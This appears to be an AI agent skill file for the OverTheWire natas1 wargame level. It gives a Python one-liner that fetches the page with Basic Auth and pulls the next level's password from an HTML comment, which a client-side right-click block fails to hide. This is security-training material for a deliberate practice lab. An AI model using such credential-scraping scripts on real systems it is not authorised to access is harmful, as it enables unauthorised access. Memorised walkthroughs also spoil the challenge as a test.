---
name: natas-1
description: >-
  Use when solving OverTheWire natas1: given natas1 credentials, fetch the raw
  page (right-click block is client-side only) and extract the natas2 password
  from the HTML comment.
---
# natas1

**Input:** username and password for natas1.

**Weakness:** right-click is blocked only by a JavaScript `oncontextmenu` handler; the natas2 password is still in an HTML comment in the page source, which any HTTP client reads directly.

**Network:** run on a host that can reach `natas1.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. Derive the natas2 password from the live page (never hardcode it). Replace `USER` and `PASS` with the natas1 credentials:

```bash
python -c "import base64,re,urllib.request;u,p='USER','PASS';r=urllib.request.Request('http://natas1.natas.labs.overthewire.org/');r.add_header('Authorization','Basic '+base64.b64encode(f'{u}:{p}'.encode()).decode());h=urllib.request.urlopen(r,timeout=30).read().decode();print(re.search(r'password for natas2 is ([A-Za-z0-9]+)',h).group(1))"
```

2. The printed string is the natas2 password.

3. Confirm by GETting `http://natas2.natas.labs.overthewire.org/` with Basic Auth `natas2:<password>` and expecting HTTP 200.
